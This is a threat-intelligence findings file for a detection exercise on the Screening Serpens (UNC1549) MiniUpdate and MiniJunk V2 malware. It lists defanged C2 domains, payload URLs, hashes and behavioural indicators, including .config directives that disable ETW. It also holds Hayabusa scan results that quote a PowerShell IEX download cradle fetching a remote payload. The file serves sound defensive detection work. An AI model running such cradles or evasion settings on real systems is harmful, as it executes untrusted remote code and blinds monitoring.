# Findings — IOCs: Screening Serpens (UNC1549) MiniUpdate & MiniJunk V2

**Source:** [Unit 42, Palo Alto Networks](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
**Extracted:** 2026-07-19 · **Defang notation:** `[.]` = `.`, `hxxps` = `https`

> Detection results from EVTX scans / SIEM queries get appended below the IOC tables as the exercise progresses.

## Domains (C2 & delivery)

| Domain | Associated malware / role |
|--------|---------------------------|
| licencemanagers.azurewebsites[.]net | MiniJunk V2 C2 |
| LicenceSupporting.azurewebsites[.]net | MiniJunk V2 C2 |
| PeerDistSvcManagers.azurewebsites[.]net | MiniJunk V2 C2 |
| ThemesManagers.azurewebsites[.]net | MiniJunk V2 C2 |
| ThemesProviderManagers.azurewebsites[.]net | MiniJunk V2 C2 |
| NanoMatrix.azurewebsites[.]net | MiniJunk V2 (US) C2 |
| QuantumWeave.azurewebsites[.]net | MiniJunk V2 (US) C2 |
| ElementShift.azurewebsites[.]net | MiniJunk V2 (US) C2 |
| buisness-centeral.azurewebsites[.]net | MiniUpdate C2 |
| buisness-centeral-transportation.azurewebsites[.]net | MiniUpdate C2 |
| Buisness-centeral-transportation[.]com | MiniUpdate C2 |
| business-startup[.]org | MiniUpdate C2 |
| business-startup.azurewebsites[.]net | MiniUpdate C2 |
| Businessstartup.azurewebsites[.]net | MiniUpdate C2 |
| PremierHealthAdvisory[.]com | MiniUpdate (UAE) C2 |
| PremierHealthAdvisory.azurewebsites[.]net | MiniUpdate (UAE) C2 |
| Premier-HealthAdvisory.azurewebsites[.]net | MiniUpdate (UAE) C2 |
| Ramiltonsfinance[.]com | MiniUpdate (ME) C2 |
| Ramiltonsfinance.azurewebsites[.]net | MiniUpdate (ME) C2 |
| Ramiltons-finance.azurewebsites[.]net | MiniUpdate (ME) C2 |
| docspace-y4cumb.onlyoffice[.]com | Payload delivery (ONLYOFFICE) |
| docspace-twpf0e.onlyoffice[.]com | Payload delivery (ONLYOFFICE) |
| app[redacted][.]live | Fake meeting lure domain |

> Note: report lists `Ramiltonsfinance.azurewebsites[.]neti` — trailing `i` appears to be a source typo; canonical form is `.net`.

## URLs

| URL | Role |
|-----|------|
| hxxps[:]//docspace-y4cumb.onlyoffice[.]com/storage/files/root/folder_3602000/file_3601577/v1/content.zip[...] | Payload archive (Portable Platform.zip) |
| hxxps[:]//app[redacted][.]live/meeting/edcdba624ddb43c2a1dcf334aa493068 | Fake meeting landing page |
| hxxps[:]//docspace-twpf0e.onlyoffice[.]com/storage/files/root/folder_3765000/file_3764519/v1/content.zip?filename=remote.[REDACTED].zip | Payload archive |
| hxxps[:]//2117.filemail[.]com/api/file/get?filekey=T0EnWQ6NugHkW_kLfDxPBEw_um6NSkg9ZwNRQ_5lrKrLLUo35pV8m3TKv1LqF3zZzdUm | Payload delivery (filemail) |

## SHA256 Hashes

| SHA256 | File | Campaign |
|--------|------|----------|
| 44f4f7aca7f1d9bfdaf7b3736934cbe19f851a707662f8f0b0c49b383e054250 | Initial archive file | MiniUpdate — US |
| 332ba2f0297dfb1599adecc3e9067893e7cf243aa23aedce4906a4c480574c17 | Hiring Portal.zip | MiniUpdate — US |
| 0db36a04d304ad96f9e6f97b531934594cd95a5cea9ff2c9af249201089dc864 | UpdateChecker.dll | MiniUpdate — US |
| 38bd137c672bd58d08c4f0502f993a6561e2c3411773d1ae57ee0151a0a9d11d | Initial archive file | MiniUpdate — Israel |
| d4a7e9f107fe40c1a5d0139c6c6e25bf6bf57f61feff090bee28f476bb3cc3c2 | UpdateChecker.dll | MiniUpdate — Israel |
| bc3b44154518c5794ce639108e7b9c5fecb0c189607a26de1aaed518d890c7ad | UpdateChecker.dll | MiniUpdate — UAE / ME |
| 74882085db2088356ed7f72f01e0404a0a98cda88ef56fb15ce74c1f36b26d27 | (payload) | MiniUpdate — ME |
| 9cf029daca89523d917dafed0568d11d00e45ec96b5b90b4a1f7fd4018c7da84 | uevmonitor.dll | MiniJunk V2 — ME |
| b19e06da580cf91691eda066ac9ee4b09c6e5dc26c367af12660fe1f9306eec4 | unbcl.dll | MiniJunk V2 — ME |
| 8808c794c24367438f183e4be941876f1d3ecd0c8d2eb43b10d2380841d2283b | Portable Platform.zip | MiniJunk V2 — US |
| 43dc62cef52ebdd69e79f10015b3e13890f26c058325c0ff139c70f8d8eadcfa | Connection.dll | MiniJunk V2 — US |
| 9e4a658e6d831c9e9bdfe11884a75b7c64812ed0a80e8495ddf6b316505acac1 | unbcl.dll | MiniJunk V2 — US |

## Host / Behavioral Indicators

- Scheduled task names: `WindowsSecurityUpdate` (logon-triggered), `Synchronize OS`, daily task @ 09:30 local
- Staged files: `update.exe` (renamed setup.exe), `update.exe.config`, `Updater.dll`, `UpdateChecker.dll` under `%LOCALAPPDATA%\...\bin\update\`
- MiniJunk V2 drops: `SoftwareLicencing.exe` (renamed MS binary) + `unbcl.dll`
- `.config` evasion directives: `<etwEnable enabled="false"/>`, `<bypassTrustedAppStrongNames enabled="true"/>`, `<publisherPolicy apply="no"/>`, `<requiredRuntime safemode="true" imageVersion="v4.0.30319"/>`, `<probing privatePath="."/>`
- Anti-analysis: requires parent process `svchost.exe`; requires process name `update.exe`; date-gate (Connection.dll runs only after 2026-03-27 13:30:00 UTC)
- C2 URIs: `/agent/poll`, `/api/app/check`, `/api/app/update`, `/api/app/comment`
- User-Agents: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36` (MiniUpdate); `...Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0` (MiniJunk V2)

---

## Detection Results

### Hayabusa scan — 2026-07-19

**File:** `evtx/ID4103-4104-Payload-download-via-PowerShell.evtx` (Module sample)
**Engine:** hayabusa 1.28.1 `json-timeline` · **Host:** `fs03vuln.offsec.lan` · **User:** `OFFSEC\admmig` · **Event time:** 2022-01-24 12:11:11 -08:00
**Channel covered:** `Microsoft-Windows-PowerShell/Operational` only

| Severity | Rule | EID | Rule ID |
|----------|------|-----|---------|
| High | Suspicious PowerShell Invocations - Specific | 4104 | 8655ba53-c937-dbcf-91c5-3125219b9497 |
| Informational | PwSh Scriptblock (x2) | 4104 | 0f3b1343-65a5-4879-b512-9d61b0e4e3ba |
| Informational | PwSh Pipeline Exec | 4103 | d3fb8f7b-88b0-4ff4-bf9b-ca286ce19031 |

**High-severity payload (download cradle):**
```
IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')
```

**ATT&CK mapping:**
- T1059.001 — Command & Scripting Interpreter: PowerShell (powershell.exe v4.0, ConsoleHost, IEX)
- T1105 — Ingress Tool Transfer (`Net.WebClient.downloadString` fetching remote payload disguised as .png)
- T1204.002 — User Execution context (interactive host, admin user)

**Relevance to Screening Serpens:** exercises the **T1105** Phase-1 delivery technique as a PowerShell-based proxy (real campaign used certutil + browser chain). **Coverage gap:** this EVTX only covers `PowerShell/Operational`; the campaign's high-value techniques — AppDomainManager hijacking (T1574.014), DLL side-loading (T1574.002), ETW tamper (T1562.002), scheduled-task persistence (T1053.005) — land in `Sysmon/Operational` (EID 7/13) and `Security` (4688/4698), which are **not** present in this sample. Crown-jewel techniques remain unvalidated.
